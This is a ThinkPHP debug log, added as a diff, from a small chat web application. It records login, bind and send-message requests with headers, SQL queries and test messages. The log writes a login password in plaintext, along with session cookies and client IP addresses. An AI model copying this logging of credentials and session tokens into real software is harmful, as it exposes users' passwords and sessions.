+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006484s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.001704s ]
+---------------------------------------------------------------
+[ 2017-07-30T21:00:32+08:00 ] 0.0.0.0 153.99.17.178 POST /home/chat/bind.html
+[ info ] eddchat.oumaikeji.com/home/chat/bind.html [运行时间：0.081088s][吞吐率：12.33req/s] [内存消耗：3,425.54kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'bind',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '49',
+  'x-original-url' => '/home/chat/bind.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=002nq4pq8j8uhgc0mf8dnsitr6; CUID=1-yqz',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'client_id' => '7f0000010fa00000000d',
+  'client_name' => 'client',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->bind[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003596s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006581s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000705s ]
+[ sql ] [ SQL ] SELECT `avatar`,`user_login` FROM `edd_users` WHERE  `user_login` = 'client' [ RunTime:0.000561s ]
+---------------------------------------------------------------
+[ 2017-07-30T21:00:35+08:00 ] 0.0.0.0 153.99.17.178 POST /home/chat/send_message.html
+[ info ] eddchat.oumaikeji.com/home/chat/send_message.html [运行时间：0.093672s][吞吐率：10.68req/s] [内存消耗：3,434.36kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'send_message',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '39',
+  'x-original-url' => '/home/chat/send_message.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=002nq4pq8j8uhgc0mf8dnsitr6; CUID=Z9udu',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'self_name' => 'client',
+  'msg' => '123123123',
+  'type' => 'all',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->send_message[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.015172s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006891s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000874s ]
+[ sql ] [ SQL ] SELECT `avatar`,`id` FROM `edd_users` WHERE  `user_login` = 'client' [ RunTime:0.000659s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_mess` [ RunTime:0.005654s ]
+[ sql ] [ SQL ] INSERT INTO `edd_mess` (`mess_date` , `from_client_id` , `to_client_id` , `content`) VALUES ('1501419635' , 54 , 0 , '123123123') [ RunTime:0.000567s ]
+---------------------------------------------------------------
+[ 2017-07-30T21:21:01+08:00 ] 0.0.0.0 60.181.130.13 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.044692s][吞吐率：22.38req/s] [内存消耗：2,494.91kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'zh-CN,zh;q=0.8,en;q=0.6,ro;q=0.4',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T21:21:04+08:00 ] 0.0.0.0 60.181.130.13 GET /favicon.ico
+[ info ] eddchat.oumaikeji.com/favicon.ico [运行时间：0.031431s][吞吐率：31.82req/s] [内存消耗：1,854.80kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/favicon.ico',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=1e5iss2p23a7l159v8jr405f47',
+  'accept-language' => 'zh-CN,zh;q=0.8,en;q=0.6,ro;q=0.4',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T21:21:23+08:00 ] 0.0.0.0 60.181.130.13 POST /home/login/login_think.html
+[ info ] eddchat.oumaikeji.com/home/login/login_think.html [运行时间：0.089723s][吞吐率：11.15req/s] [内存消耗：3,540.52kb] [文件加载：64]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'login',
+    2 => 'login_think',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '34',
+  'x-original-url' => '/home/login/login_think.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=1e5iss2p23a7l159v8jr405f47',
+  'accept-language' => 'zh-CN,zh;q=0.8,en;q=0.6,ro;q=0.4',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'client',
+  'password' => 'client123',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->login_think[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001914s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.027047s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `user_login` = 'client' LIMIT 1 [ RunTime:0.000799s ]
+[ sql ] [ SQL ] UPDATE `edd_users`  SET `last_login_time`='1501420883',`last_login_ip`='60.181.130.13',`user_hits`=27  WHERE  `id` = 54 [ RunTime:0.000591s ]
+---------------------------------------------------------------
+[ 2017-07-30T21:21:24+08:00 ] 0.0.0.0 60.181.130.13 GET /home/chat/home_page.html
+[ info ] eddchat.oumaikeji.com/home/chat/home_page.html [运行时间：0.193380s][吞吐率：5.17req/s] [内存消耗：3,563.03kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'home_page',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/home_page.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=1e5iss2p23a7l159v8jr405f47; CUID=iGSKS',
+  'accept-language' => 'zh-CN,zh;q=0.8,en;q=0.6,ro;q=0.4',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\chat\home_page.html [ array (
+  0 => 'client_id',
+  1 => 'client_img',
+  2 => 'client_name',
+  3 => 'clients',
+  4 => 'today_mess',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001063s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.005944s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000858s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000570s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` [ RunTime:0.000712s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000569s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000561s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000534s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000539s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000536s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000532s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000524s ]
+---------------------------------------------------------------
+[ 2017-07-30T21:21:24+08:00 ] 0.0.0.0 60.181.130.13 POST /home/chat/bind.html
+[ info ] eddchat.oumaikeji.com/home/chat/bind.html [运行时间：0.092158s][吞吐率：10.85req/s] [内存消耗：3,425.97kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'bind',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '49',
+  'x-original-url' => '/home/chat/bind.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=1e5iss2p23a7l159v8jr405f47; CUID=muYRW',
+  'accept-language' => 'zh-CN,zh;q=0.8,en;q=0.6,ro;q=0.4',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'client_id' => '7f0000010fa00000000e',
+  'client_name' => 'client',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->bind[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.012847s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006509s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000721s ]
+[ sql ] [ SQL ] SELECT `avatar`,`user_login` FROM `edd_users` WHERE  `user_login` = 'client' [ RunTime:0.000562s ]
+---------------------------------------------------------------
+[ 2017-07-30T21:21:25+08:00 ] 0.0.0.0 60.181.130.13 GET /home/chat/favicon.png
+[ info ] eddchat.oumaikeji.com/home/chat/favicon.png [运行时间：0.067740s][吞吐率：14.76req/s] [内存消耗：3,454.54kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'favicon.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/favicon.png',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=1e5iss2p23a7l159v8jr405f47; CUID=LWidv',
+  'accept-language' => 'zh-CN,zh;q=0.8,en;q=0.6,ro;q=0.4',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.005751s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006564s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000718s ]
+---------------------------------------------------------------
+[ 2017-07-30T21:21:35+08:00 ] 0.0.0.0 60.181.130.13 POST /home/chat/send_message.html
+[ info ] eddchat.oumaikeji.com/home/chat/send_message.html [运行时间：0.079462s][吞吐率：12.58req/s] [内存消耗：3,434.59kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'send_message',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '44',
+  'x-original-url' => '/home/chat/send_message.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=1e5iss2p23a7l159v8jr405f47; CUID=pVWBW',
+  'accept-language' => 'zh-CN,zh;q=0.8,en;q=0.6,ro;q=0.4',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'self_name' => 'client',
+  'msg' => 'gfhfh fghgfhfg',
+  'type' => 'all',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->send_message[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.009892s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006235s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000728s ]
+[ sql ] [ SQL ] SELECT `avatar`,`id` FROM `edd_users` WHERE  `user_login` = 'client' [ RunTime:0.000549s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_mess` [ RunTime:0.005671s ]
+[ sql ] [ SQL ] INSERT INTO `edd_mess` (`mess_date` , `from_client_id` , `to_client_id` , `content`) VALUES ('1501420895' , 54 , 0 , 'gfhfh fghgfhfg') [ RunTime:0.000498s ]
+---------------------------------------------------------------
+[ 2017-07-30T21:21:38+08:00 ] 0.0.0.0 60.181.130.13 POST /home/chat/send_message.html
+[ info ] eddchat.oumaikeji.com/home/chat/send_message.html [运行时间：0.072362s][吞吐率：13.82req/s] [内存消耗：3,434.58kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'send_message',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '40',
+  'x-original-url' => '/home/chat/send_message.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=1e5iss2p23a7l159v8jr405f47; CUID=Pc4gl',
+  'accept-language' => 'zh-CN,zh;q=0.8,en;q=0.6,ro;q=0.4',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'self_name' => 'client',
+  'msg' => 'fhg hffgh ',
+  'type' => 'all',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->send_message[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001070s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006450s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000926s ]
+[ sql ] [ SQL ] SELECT `avatar`,`id` FROM `edd_users` WHERE  `user_login` = 'client' [ RunTime:0.000705s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_mess` [ RunTime:0.006227s ]
+[ sql ] [ SQL ] INSERT INTO `edd_mess` (`mess_date` , `from_client_id` , `to_client_id` , `content`) VALUES ('1501420898' , 54 , 0 , 'fhg hffgh ') [ RunTime:0.000550s ]
+---------------------------------------------------------------
+[ 2017-07-30T21:21:39+08:00 ] 0.0.0.0 60.181.130.13 POST /home/chat/send_message.html
+[ info ] eddchat.oumaikeji.com/home/chat/send_message.html [运行时间：0.063478s][吞吐率：15.75req/s] [内存消耗：3,429.14kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'send_message',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '30',
+  'x-original-url' => '/home/chat/send_message.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=1e5iss2p23a7l159v8jr405f47; CUID=fsLI5',
+  'accept-language' => 'zh-CN,zh;q=0.8,en;q=0.6,ro;q=0.4',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'self_name' => 'client',
+  'msg' => '',
+  'type' => 'all',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->send_message[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003076s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006260s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000740s ]
+---------------------------------------------------------------
+[ 2017-07-30T21:21:42+08:00 ] 0.0.0.0 60.181.130.13 POST /home/chat/send_message.html
+[ info ] eddchat.oumaikeji.com/home/chat/send_message.html [运行时间：0.070735s][吞吐率：14.14req/s] [内存消耗：3,434.39kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'send_message',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '45',
+  'x-original-url' => '/home/chat/send_message.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=1e5iss2p23a7l159v8jr405f47; CUID=Qij3F',
+  'accept-language' => 'zh-CN,zh;q=0.8,en;q=0.6,ro;q=0.4',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'self_name' => 'client',
+  'msg' => 'hfghfghfghfghhg',
+  'type' => 'all',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->send_message[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001109s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006360s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000761s ]
+[ sql ] [ SQL ] SELECT `avatar`,`id` FROM `edd_users` WHERE  `user_login` = 'client' [ RunTime:0.000561s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_mess` [ RunTime:0.005751s ]
+[ sql ] [ SQL ] INSERT INTO `edd_mess` (`mess_date` , `from_client_id` , `to_client_id` , `content`) VALUES ('1501420902' , 54 , 0 , 'hfghfghfghfghhg') [ RunTime:0.000494s ]
+---------------------------------------------------------------
+[ 2017-07-30T21:22:18+08:00 ] 0.0.0.0 60.181.130.13 GET /home/chat/home_page.html
+[ info ] eddchat.oumaikeji.com/home/chat/home_page.html [运行时间：0.136531s][吞吐率：7.32req/s] [内存消耗：3,565.70kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'home_page',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/home_page.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=1e5iss2p23a7l159v8jr405f47; CUID=sRJGk',
+  'accept-language' => 'zh-CN,zh;q=0.8,en;q=0.6,ro;q=0.4',
+  'accept-encoding' => 'gzip, deflate, sdch',
